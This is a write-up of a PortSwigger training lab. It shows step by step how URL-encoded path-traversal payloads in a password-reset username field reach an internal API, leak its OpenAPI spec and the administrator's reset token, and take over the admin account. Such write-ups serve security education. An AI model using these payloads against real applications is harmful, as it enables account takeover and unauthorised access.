# Exploiting server-side parameter pollution in a REST URL

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string), you'll learn: Exploiting server-side parameter pollution in a REST URL! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

To solve the lab, log in as the `administrator` and delete `carlos`.

## Enumeration

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510185007.png)

In here, we can reset an account's password via the "Forgot password?" link.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510185242.png)

We can try to submit a random username:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510185315.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510185341.png)

When we clicked the "Submit" button, it'll send a POST request to `/forgot-password` with parameter `csrf` and `username`.

After that, if the username is invalid, it'll respond `"The provided username \"foobar\" does not exist"`.

In this endpoint, we can test for server-side parameter pollution on the `username` parameter.

**After some trials and errors, I found something weird after truncating query strings via `#`:**
```http
POST /forgot-password HTTP/2

csrf=jzd7KrpvqB9nYMaDfeD9faWWUgNf8jBh&username=foobar%23
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510185715.png)

Hmm... `Invalid route`??

A RESTful API may place parameter names and values in the URL path, rather than the query string. For example, consider the following path:

```
/api/users/123
```

The URL path might be broken down as follows:

- `/api` is the root API endpoint.
- `/users` represents a resource, in this case `users`.
- `/123` represents a parameter, here an identifier for the specific user.

Consider an application that enables us to edit user profiles based on their username. Requests are sent to the following endpoint:

```http
GET /edit_profile.php?name=peter
```

This results in the following server-side request:

```http
GET /api/private/users/peter
```

An attacker may be able to manipulate server-side URL path parameters to exploit the API. To test for this vulnerability, add [path traversal](https://portswigger.net/web-security/file-path-traversal) sequences to modify parameters and observe how the application responds.

We could submit URL-encoded `peter/../admin` as the value of the `name` parameter:

```http
GET /edit_profile.php?name=peter%2f..%2fadmin
```

This may result in the following server-side request:

```http
GET /api/private/users/peter/../admin
```

If the server-side client or back-end API normalize this path, it may be resolved to `/api/private/users/admin`.

In our case, the browser sends the following request:

```http
POST /forgot-password HTTP/2

csrf=jzd7KrpvqB9nYMaDfeD9faWWUgNf8jBh&username=foobar%23
```

And the server-side request may resulted in this:

```http
GET /api/users/foobar#/email
```

## Exploitation

Armed with above information, we can try to **perform path traversal to reset password on account `administrator`**:

```http
csrf=jzd7KrpvqB9nYMaDfeD9faWWUgNf8jBh&username=foobar%2f..%2fadministrator
```

Which the server-side request may resulted in:

```http
GET /api/users/foobar/../administrator/email
```

And after path normalization, it should be resolved to this:

```http
GET /api/users/administrator/email
```

Let's try that!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510190443.png)

Nice! We can trigger a reset password on account `administrator` via path traversal!

**Now, what if I traverse back to the root of the path (`/`)?**
```http
POST /forgot-password HTTP/2

csrf=jzd7KrpvqB9nYMaDfeD9faWWUgNf8jBh&username=foobar%2f..%2f..%2f..%2f..%2f..%2f
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510191409.png)

Hmm... Looks like **it returned HTTP status 404 Not Found**.

Also, when the internal API accessed an invalid endpoint, it also said: `Please refer to the API definition`.

Ahh... **I wonder if there's any API documentation on the internal API server**...

**Here's some examples of possible API documentation endpoint:**
```
/api
/swagger/index.html
/openapi.json
```

After trying different endpoints, I found that **`/openapi.json` works**!

```http
POST /forgot-password HTTP/2

csrf=jzd7KrpvqB9nYMaDfeD9faWWUgNf8jBh&username=foobar%2f..%2f..%2f..%2f..%2f..%2fopenapi.json%23
```

By doing so, the server-side request should be resulted in:

```http
GET /api/users/foobar/../../../../../openapi.json#/email
```

After path normalization:

```http
GET /openapi.json
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510191841.png)

Nice! We get the internal API documentation!

Beautified: 
```json
{
  "openapi": "3.0.0",
  "info": {
    "title": "User API",
    "version": "2.0.0"
  },
  "paths": {
    "/api/internal/v1/users/{username}/field/{field}": {
      "get": {
        "tags": [
          "users"
        ],
        "summary": "Find user by username",
        "description": "API Version 1",
        "parameters": [
          {
            "name": "username",
            "in": "path",
            "description": "Username",
            "required": true,
            "schema": {
        ...}
```

**In the `paths` attribute, we can see there's a route:**
```
/api/internal/v1/users/{username}/field/{field}
```

In the above route, we can see there's a parameter called `field`. **It seems like it's referring to the `user` object's attribute (`field`)**!

Armed with above information, we can try to get `administrator`'s user object attribute `username`'s value for testing:

```http
POST /forgot-password HTTP/2

csrf=jzd7KrpvqB9nYMaDfeD9faWWUgNf8jBh&username=foobar%2f..%2f..%2f..%2f..%2f..%2f/api/internal/v1/users/administrator/field/username%23
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510192631.png)

As expected, it returned the username value!

**Moreover, by viewing the source page of `/forgot-password`, we can see that there's a JavaScript file being loaded:**
```html
<script src="/static/js/forgotPassword.js"></script>
```

**`/static/js/forgotPassword.js`:**
```javascript
let forgotPwdReady = (callback) => {
    if (document.readyState !== "loading") callback();
    else document.addEventListener("DOMContentLoaded", callback);
}
[...]
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});
```

When the DOM (Document Object Model) has fully loaded, if GET parameter name `reset-token` exist, it'll redirect us to `/forgot-password?passwordResetToken=<resetToken>`.

Hmm... What if we **exploit the server-side parameter pollution and path traversal to retrieve `administrator`'s reset token**??

To do so, we first generate a reset token for account `administrator`:

```http
POST /forgot-password HTTP/2

csrf=jzd7KrpvqB9nYMaDfeD9faWWUgNf8jBh&username=administrator
```

**Then, exploit the server-side parameter pollution and path traversal to get its reset token:**
```http
POST /forgot-password HTTP/2

csrf=jzd7KrpvqB9nYMaDfeD9faWWUgNf8jBh&username=foobar%2f..%2f..%2f..%2f..%2f..%2f/api/internal/v1/users/administrator/field/passwordResetToken%23
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510193151.png)

Nice! We got the reset token (`uyuj0uianhqkeryhkvackien1bvmc23c`)!

**Now can send a GET request to `/forgot-password` with parameter `passwordResetToken=uyuj0uianhqkeryhkvackien1bvmc23c` to reset `administrator`'s pasword:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510193251.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510193317.png)

Next, login as user `administrator` with the new password:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510193412.png)

Finally, go to the "Admin panel" and delete user `carlos`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510193440.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510193448.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-5/images/Pasted%20image%2020240510193456.png)

## Conclusion

What we've learned:

1. Exploiting server-side parameter pollution in a REST URL